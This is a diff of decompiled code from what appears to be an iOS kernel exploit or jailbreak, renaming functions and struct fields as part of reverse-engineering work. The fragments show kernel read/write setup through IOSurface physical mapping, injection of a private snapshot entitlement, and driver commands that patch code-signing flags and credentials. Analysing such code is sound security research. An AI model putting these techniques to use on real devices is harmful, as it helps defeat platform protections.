@@ -227,7 +227,7 @@ __int64 __fastcall get_kernel_load_addr_bsm(__int64 a1, const char *a2, unsigned
 __int64 __fastcall remount_hfs(__int64 a1, const char *a2, int a3);
 bool check_root_is_apfs();
 __int64 __fastcall krw_inject_entitlements_maybe(struct_krwCtx *krwCtx, __int64 task, char *entitlementXml);
-__int64 __fastcall get_mach_thread_info(struct_krwCtx *krwCtx, __int64 a2, char *a3, __int64 a4, int a5);
+__int64 __fastcall krw_inject_entitlements_to_task(struct_krwCtx *krwCtx, __int64 a2, char *a3, __int64 a4, int a5);
 __int64 __fastcall find_connect_ioavservice(__int64 a1);
 __int64 __fastcall get_kernel_task_iokit(__int64 a1);
 __int64 test_appsepmanager_presence();
@@ -866,7 +866,7 @@ char *_CFProcessPath(void);
 
 #define DRIVER_CMD_PATCH_PARENT_CSFLAGS 1
 #define DRIVER_CMD_GET_SELF_TASK_PORT_OFFSET 2
-#define DRIVER_CMD_INJECT_TFP0_ENTITLEMENT 3
+#define DRIVER_CMD_INJECT_TFP_ENTITLEMENT 3
 #define DRIVER_CMD_PATCH_CSBLOB 6
 #define DRIVER_CMD_SET_THREAD_KOBJ_DISPATCH 7
 #define DRIVER_CMD_GET_OR_SET_SELF_UID_CRED 8
@@ -9970,7 +9970,7 @@ __int64 __fastcall setup_vm_for_kwrite(struct_krwCtx *krwCtx, __int64 a2, unsign
       v10 = v9;
       address = 0;
       v11 = vm_page_size;
-      v12 = *(uint32_t *)&krwCtx->gap_0x58;
+      v12 = *(uint32_t *)&krwCtx->ioSurfaceMemEntryMaybe;
       if ( v12 + 1 > 1 )
       {
         v14 = vm_map(mach_task_self_, &address, vm_page_size, 0, 1, v12, v9 & ~krwCtx->pageMask, 0, 3, 3, 2u);
@@ -9981,7 +9981,7 @@ __int64 __fastcall setup_vm_for_kwrite(struct_krwCtx *krwCtx, __int64 a2, unsign
       {
         return 0xFFFFFFFFLL;
       }
-      v15 = *(uint32_t *)&krwCtx->gap_0x58;
+      v15 = *(uint32_t *)&krwCtx->ioSurfaceMemEntryMaybe;
       if ( (unsigned int)(v15 + 1) >= 2 )
         v16 = address;
       else
@@ -9992,7 +9992,7 @@ __int64 __fastcall setup_vm_for_kwrite(struct_krwCtx *krwCtx, __int64 a2, unsign
         v5 = 0;
         atomic_fetch_add((atomic_ushort *volatile)v17, 0xFFFFu);
         *(uint16_t *)(v17 + 2) = 0x4000;
-        v15 = *(uint32_t *)&krwCtx->gap_0x58;
+        v15 = *(uint32_t *)&krwCtx->ioSurfaceMemEntryMaybe;
       }
       else
       {
@@ -12386,7 +12386,7 @@ __int64 __fastcall check_mount_thread_info(struct_krwCtx *krwCtx, int a2)
   strcpy(__s1, "/private/var/MobileSoftwareUpdate/mnt1");
   strcpy(v18, "/");
   krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_SNAPSHOT_MOUNTED);
-  if ( !(unsigned int)get_mach_thread_info(
+  if ( !(unsigned int)krw_inject_entitlements_to_task(
                                            krwCtx,
                         mach_task_self_,
                         "<dict><key>com.apple.private.vfs.snapshot</key><true/></dict>",
@@ -13027,7 +13027,7 @@ LABEL_16:
 // 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);
 
 //----- (00000000000154D0) ----------------------------------------------------
-__int64 __fastcall get_mach_thread_info(struct_krwCtx *krwCtx, __int64 a2, char *a3, __int64 a4, int a5)
+__int64 __fastcall krw_inject_entitlements_to_task(struct_krwCtx *krwCtx, __int64 a2, char *a3, __int64 a4, int a5)
 {
   __int64 result; // x0
   __int64 v10; // x23
@@ -19163,11 +19163,11 @@ bool __fastcall krw_setup_iosurface(struct_krwCtx *krwCtx)
     return true;
   if ( (unsigned int)(krwCtx->threadForKernelRead + 1) < 2
     || !krwCtx->gap_0xD8
-    || (unsigned int)(krwCtx->gap_0x58 + 1) < 2 )
+    || (unsigned int)(krwCtx->ioSurfaceMemEntryMaybe + 1) < 2 )
   {
     return false;
   }
-  v17[0] = krwCtx->gap_0x58;
+  v17[0] = krwCtx->ioSurfaceMemEntryMaybe;
   v4 = setup_physmap_krw(krwCtx, 0);
   if ( v4 )
     return false;
@@ -19299,7 +19299,7 @@ bool __fastcall krw_setup_iosurface_v2(struct_krwCtx *krwCtx, uint32_t *a2)
             if ( (unsigned __int64)(v21 - 1) <= 0x1F )
             {
               krwCtx->gap_0x18A0 = v21;
-              krwCtx->gap_0x58 = object[0];
+              krwCtx->ioSurfaceMemEntryMaybe = object[0];
               v22 = *(uint64_t *)(v20 + 48);
               if ( v22 )
               {
@@ -22135,11 +22135,11 @@ uint64_t __fastcall update_timer_lru_cache(struct_krwCtx *krwCtx)
   __int64 i; // x8
   __int64 v5; // x10
 
-  v2 = krwCtx->gap_0x868;
+  v2 = krwCtx->lruCacheLastUpdatedTime;
   result = mach_absolute_time();
   if ( v2 )
   {
-    if ( (result - krwCtx->gap_0x868) * krwCtx->timebase.numer / krwCtx->timebase.denom < 0x12A153440LL )
+    if ( (result - krwCtx->lruCacheLastUpdatedTime) * krwCtx->timebase.numer / krwCtx->timebase.denom < 0x12A153440LL )
       return result;
     for ( i = 0; i != 640; i += 40 )
     {
@@ -22150,7 +22150,7 @@ uint64_t __fastcall update_timer_lru_cache(struct_krwCtx *krwCtx)
     }
     result = mach_absolute_time();
   }
-  krwCtx->gap_0x868 = result;
+  krwCtx->lruCacheLastUpdatedTime = result;
   return result;
 }
 
@@ -27187,7 +27187,7 @@ __int64 __fastcall physmap_maybe(struct_krwCtx *krwCtx, vm_address_t *address, v
 {
   kern_return_t v4; // w0
 
-  v4 = vm_map(mach_task_self_, address, size, 0, 1, krwCtx->gap_0x58, paddr & ~krwCtx->pageMask, 0, 3, 3, 2u);
+  v4 = vm_map(mach_task_self_, address, size, 0, 1, krwCtx->ioSurfaceMemEntryMaybe, paddr & ~krwCtx->pageMask, 0, 3, 3, 2u);
   if ( v4 )
     return v4 | 0x80000000;
   else
@@ -27892,7 +27892,7 @@ __int64 __fastcall map_physpage_with_mem_entry(struct_krwCtx *krwCtx, vm_address
   mem_entry_name_port_t v4; // w5
   kern_return_t v6; // w0
 
-  v4 = krwCtx->gap_0x58;
+  v4 = krwCtx->ioSurfaceMemEntryMaybe;
   if ( v4 + 1 < 2 )
     return 708609;
   v6 = vm_map(mach_task_self_, a2, a3, 0, 1, v4, a4 & ~krwCtx->pageMask, 0, 3, 3, 2u);
@@ -45816,7 +45816,7 @@ __int64 __fastcall driver_dispatch_command3(struct_krwCtx *krwCtx, int cmd, __in
               case DRIVER_CMD_GET_SELF_TASK_PORT_OFFSET:
                 v30 = mach_task_self_;
                 goto LABEL_124;
-              case DRIVER_CMD_INJECT_TFP0_ENTITLEMENT:
+              case DRIVER_CMD_INJECT_TFP_ENTITLEMENT:
                 v8[0] = krw_inject_entitlements_maybe(
                           krwCtx,
                           mach_task_self_,
